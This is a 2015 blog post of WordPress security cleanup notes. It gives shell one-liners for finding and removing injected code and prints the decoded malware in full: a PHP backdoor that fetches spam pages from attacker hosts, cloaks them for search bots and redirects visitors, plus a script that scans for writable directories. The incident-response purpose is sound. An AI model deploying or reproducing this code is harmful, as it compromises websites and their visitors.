---
layout: post
title: "Wordpress security cleanup notes"
date: 2015-03-13 19:31:53 -0400
comments: true
categories: ["security","wordpress"]
---
Infected PHP Pages:
I've been looking for infected php pages with this command:
{% highlight bash %}
find . -name "*.php" | xargs grep "gzinflate(base64_decode"
{% endhighlight %}
Basically, there's malicious code inserted into the beginning of the php script and it is base64 enconded and compressed so if you look at the file, the first line looks like garbarge.  There's a backdoor on the system that keeps it coming back. I remove it with the following one liner:
<!-- more -->
{% highlight bash %}
find -name "*.php" -exec sed -i '/<?.*eval(gzinflate(base64.*?>/ d' '{}' \; -print
{% endhighlight %}
Here's the code uncompressed and decoded:
{% codeblock lang:perl %}
<?php
<?php if (!defined('frmDs')) {
    define('frmDs', 1);
    error_reporting(0);
    function frm_dl($url) {
        if (function_exists('curl_init')) {
            $ch = curl_init($url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            $out = curl_exec($ch);
            if (curl_errno($ch) !== 0) $out = false;
            curl_close($ch);
        } else {
            $out = @file_get_contents($url);
        }
        return trim($out);
    }
    function frm_crpt($in) {
        $il = strlen($in);
        $o = '';
        for ($i = 0;$i < $il;$i++) $o.= $in[$i] ^ '*';
        return $o;
    }
    function frm_getcache($tmpdir, $link, $cmtime, $toe = false) {
        $f = $tmpdir . '/sess_' . md5(preg_replace('/^http:\/\/[^\/]+/', '', $link));
        $fe = file_exists($f);
        if (!$fe || time() - filemtime($f) > 60 * $cmtime) {
            $dlc = frm_dl($link);
            if ($fe && $dlc === false) @touch($f);
            else {
                if ($fe && empty($dlc) && $toe) {
                    @touch($f);
                } else {
                    if ($fp = @fopen($f, 'w')) {
                        fwrite($fp, frm_crpt($dlc));
                        fclose($fp);
                    } else {
                        return $dlc;
                    }
                }
            }
        }
        $fc = @file_get_contents($f);
        return ($fc) ? frm_crpt($fc) : '';
    }
    function frm_isbot() {
        $ua = @strtolower($_SERVER['HTTP_USER_AGENT']);
        if (($lip = ip2long($_SERVER['REMOTE_ADDR'])) < 0) $lip+= 4294967296;
        $rs = array(array(3639549953, 3639558142), array(1089052673, 1089060862), array(1123635201, 1123639294), array(1208926209, 1208942590), array(3512041473, 3512074238), array(1113980929, 1113985022), array(1249705985, 1249771518), array(1074921473, 1074925566), array(3481178113, 3481182206), array(2915172353, 2915237886), array(2850291712, 2850357247));
        foreach ($rs as $r) if ($lip >= $r[0] && $lip <= $r[1]) return true;
        if (!$ua) return true;
        $bots = array('googlebot', 'bingbot', 'slurp', 'msnbot', 'jeeves', 'teoma', 'crawler', 'spider');
        foreach ($bots as $b) if (strpos($ua, $b) !== false) return true;
        $h = @gethostbyaddr($_SERVER['REMOTE_ADDR']);
        $hba = array('google', 'msn', 'yahoo');
        if ($h) foreach ($hba as $hb) if (strpos($h, $hb) !== false) return true;
        return false;
    }
    function frm_tmpdir() {
        $fs = array('/tmp', '/var/tmp', './wp-content/cache', './wp-content/uploads', './tmp', './cache', './images');
        foreach (array('TMP', 'TEMP', 'TMPDIR') as $v) {
            if ($t = getenv($v)) {
                $fs[] = $t;
            }
        }
        if (function_exists('sys_get_temp_dir')) {
            $fs[] = sys_get_temp_dir();
        }
        $fs[] = '.';
        foreach ($fs as $f) {
            $tf = $f . '/' . md5(rand());
            if ($fp = @fopen($tf, 'w')) {
                fclose($fp);
                unlink($tf);
                return $f;
            }
        }
        return false;
    }
    function frm_seref() {
        $r = @strtolower($_SERVER["HTTP_REFERER"]);
        $ses = array('google', 'bing', 'yahoo', 'ask', 'aol');
        foreach ($ses as $se) if (strpos($r, $se . '.') != false) return true;
        return false;
    }
    function frm_havekey($s = false) {
        $nks = explode('|', 'abilify|albenza|aldactone|amoxil|antabuse|apcalis|atarax|baclofen|bactrim|bimatoprost|buspar|celebrex|celexa|cialis|cipro|clomid|desyrel|diflucan|doxycycline|elavil|erectalis|eriacta|erythromycin|finpecia|flagyl|glucophage|inderal|kamagra|lasix|levaquin|levitra|lexapro|megalis|mobic|motilium|nexium|nolvadex|orlistat|paxil|penisole|periactin|premarin|priligy|propecia|proscar|proventil|retin-a|robaxin|seroquel|silagra|sildalis|silvitra|strattera|stromectol|p-force|synthroid|tadacip|tadalis|tadapox|tenormin|tetracycline|topamax|valtrex|ventolin|viagra|vigora|wellbutrin|zanaflex|zenegra|zithromax|sildenafil|tadalafil|vardenafil|zovirax');
        $k = ($s == false) ? @strtolower($_SERVER["HTTP_REFERER"] . $_SERVER["REQUEST_URI"]) : $s;
        if (strpos($k, "site%3A") !== false || strpos($k, "inurl%3A") !== false) return '';
        foreach ($nks as $n) if (preg_match("/(|_)$n(|_)/", $k)) return $n;
        return '';
    }
    function frm_strtonum($Str, $Check, $Magic) {
        $Int32Unit = 4294967296;
        $length = strlen($Str);
        for ($i = 0;$i < $length;$i++) {
            $Check*= $Magic;
            if ($Check >= $Int32Unit) {
                $Check = ($Check - $Int32Unit * (int)($Check / $Int32Unit));
                $Check = ($Check < - 2147483648) ? ($Check + $Int32Unit) : $Check;
            }
            $Check+= ord($Str{$i});
        }
        return $Check;
    }
    function frm_chhash($String) {
        $Check1 = frm_strtonum($String, 0x1505, 0x21);
        $Check2 = frm_strtonum($String, 0, 0x1003F);
        $Check1 >>= 2;
        $Check1 = (($Check1 >> 4) & 0x3FFFFC0) | ($Check1 & 0x3F);
        $Check1 = (($Check1 >> 4) & 0x3FFC00) | ($Check1 & 0x3FF);
        $Check1 = (($Check1 >> 4) & 0x3C000) | ($Check1 & 0x3FFF);
        $T1 = (((($Check1 & 0x3C0) << 4) | ($Check1 & 0x3C)) << 2) | ($Check2 & 0xF0F);
        $T2 = (((($Check1 & 0xFFFFC000) << 4) | ($Check1 & 0x3C00)) << 0xA) | ($Check2 & 0xF0F0000);
        $Hashnum = ($T1 | $T2);
        $CheckByte = 0;
        $Flag = 0;
        $HashStr = sprintf('%u', $Hashnum);
        $length = strlen($HashStr);
        for ($i = $length - 1;$i >= 0;$i--) {
            $Re = $HashStr{$i};
            if (1 === ($Flag % 2)) {
                $Re+= $Re;
                $Re = (int)($Re / 10) + ($Re % 10);
            }
            $CheckByte+= $Re;
            $Flag++;
        }
        $CheckByte%= 10;
        if (0 !== $CheckByte) {
            $CheckByte = 10 - $CheckByte;
            if (1 === ($Flag % 2)) {
                if (1 === ($CheckByte % 2)) {
                    $CheckByte+= 9;
                }
                $CheckByte >>= 1;
            }
        }
        return '7' . $CheckByte . $HashStr;
    }
    function frm_chpr($url, $td) {
        $ch = frm_chhash($url);
        $res = frm_getcache($td, "http://toolbarqueries.google.com/tbr?client=navclient-auto&features=Rank&ch=$ch&q=info:$url", 60 * 24 * 7);
        if (($pos = strpos($res, "Rank_")) !== false) return substr($res, 9, 1);
    }
    function frm_red($k) {
        if (!frm_isbot() && frm_seref()) {
            $r = @urlencode($_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);
            $s = @urlencode($_SERVER['HTTP_REFERER']);
            die("<!DOCTYPE html><html><body><script>document.location=(\"http://178.73.212.30/stat/go.php?k=$k&s=$s&r=$r\");</script></body></html>");
        }
    }
    $tdir = frm_tmpdir();
    $isb = frm_isbot();
    $k = frm_havekey();
    $host = preg_replace('/^w{3}\./', '', strtolower($_SERVER['HTTP_HOST']));
    if ($cv = @$_POST[md5($host . 'ch') ]) {
        exit($cv);
    }
    if ($tdir && strlen($host) < 100 && !preg_match('/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/', $host)) {
        $parg = substr(preg_replace('/[^a-z]+/', '', strtolower(base64_encode(md5($host . 'p1')))), 0, 3);
        $sp = "http://muqypnfsk.kwik.to/stat/feed.php?pa=$parg&h=$host";
        //
        $tp = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
        if ($isb && ($ppr = frm_chpr($tp)) > 1) {
            $pc = frm_getcache($tdir, $sp . "&a=l&p=" . urlencode($tp) . "&pr=$ppr", 60 * 24);
            if ($pc) die($pc);
        }
        //
        $ruri = strtolower($_SERVER['REQUEST_URI']);
        $pageid = (isset($_GET[$parg])) ? $_GET[$parg] * 1 : 0;
        if ((strpos($ruri, '/?') === 0 || strpos($ruri, '/index.php?') === 0) && $pageid > 0) {
            frm_red($k);
            die(frm_getcache($tdir, $sp . "&p=$pageid", 60 * 24, true));
        }
        if (($ruri == '/' || $ruri == '/index.php') && $isb) {
            $c = frm_getcache($tdir, $sp, 60 * 24);
            if ($c) die($c);
        }
        //
        if ($k && $sdl = frm_getcache($tdir, $sp . "&a=s", ($isb ? 30 : 60 * 24 * 7), true)) {
            if (strpos($sdl, '|' . $ruri . '|') !== false) {
                frm_red($k);
                die(frm_getcache($tdir, $sp . "&a=s&p=" . urlencode($ruri), 60 * 24 * 7, true));
            }
        }
    }
    if ($k) frm_red($k);
}
{% endcodeblock %}
Another issue is with the .htaccess files being written to.  I search for all of the .htaccess files and check for strings that are know to me that are not supposed to be there.
{% highlight bash %}
find . -name "*.htaccess" | xargs grep "windows-media-player"
find . -name "*.htaccess" | xargs grep "moby"
find . -name "*.htaccess" | xargs grep "click"
{% endhighlight %}

The SEO spam was primarilly being generated from a forum directory that was created.  This is what most concerns me, so instead of removing the forum directory, and have it put back by a back door, I changed the permissons on the directory to be 000 or not readable, not writeable and not excutable for user, group and world.  I also changed the ownership to be owned by root and the group to be root so that the webserver can't write over it, or recreate it.  It also returns a 403 Permission denied when someone tries to access it.
{% highlight bash %}
find . -name "forum" | xargs ls -la

./wordpress/domain-one.com/htdocs/forum:
total 20
d--------- 2 root     root     4096 Mar 13 13:19 .
drwxr-xr-x 6 www-data www-data 4096 Mar 13 13:19 ..
-rwxr-xr-x 1 root     root       84 Mar  4 14:47 .htaccess
-rwxr-xr-x 1 root     root     4993 Mar 13 13:19 post.php
{% endhighlight %}

I'm performing md5hashes on a clean install of wordpress and comparing them to the equivilant files on the server.  This one liner, does it for all files in a directory.
{% highlight bash %}
for file in *; do md5sum $file; done
{% endhighlight %}

I found another malicious file called sopka.php
{% highlight bash %}
root@bserver:/var/www/wordpress# locate sopka.php | xargs md5sum
3800aa78d035d209cfaf64206cdcee6d  /var/www/wordpress/domain-one.com/htdocs/sopka.php
3800aa78d035d209cfaf64206cdcee6d  /var/www/wordpress/domaon-two.com/htdocs/sopka.php
3800aa78d035d209cfaf64206cdcee6d  /var/www/wordpress/domain-three.com/htdocs/sopka.php
3800aa78d035d209cfaf64206cdcee6d  /var/www/wordpress/domain-four.com/htdocs/sopka.php
{% endhighlight %}
I chmod'd them all 000, this is the contents:
{% codeblock lang:perl %}
<?php
@ini_set('max_execution_time',0);
@set_time_limit(0);
function AllDir($Folder, &$Files){
   $result = scandir($Folder);
   foreach($result as $file){
       if ($file == '.' || $file == '..') continue;
       $FullPath = $Folder . '/' . $file;
       $Files[] = $FullPath;
       if (is_dir($FullPath)) AllDir($FullPath, $Files);}}
$StartDir = getcwd();
$Files = array();
$maxlen='hremjo';
AllDir($StartDir, $Files);
foreach($Files as $wf) {  //echo $wf."\n";
if (is_dir($wf) && is_writable($wf)){
if (strlen($maxlen)<=strlen($wf))$maxlen=$wf;
//echo $wf."\n";
}}echo 'rahui#',$maxlen,'#rahui';
?>
{% endcodeblock %}

There's also these malicous files, called sidebar.php and footer.php, I chmod'd them all to 000
{% highlight bash %}
locate sidebar.php | xargs grep bwinpoker
locate footer.php | xargs grep bwinpoker
{% endhighlight %}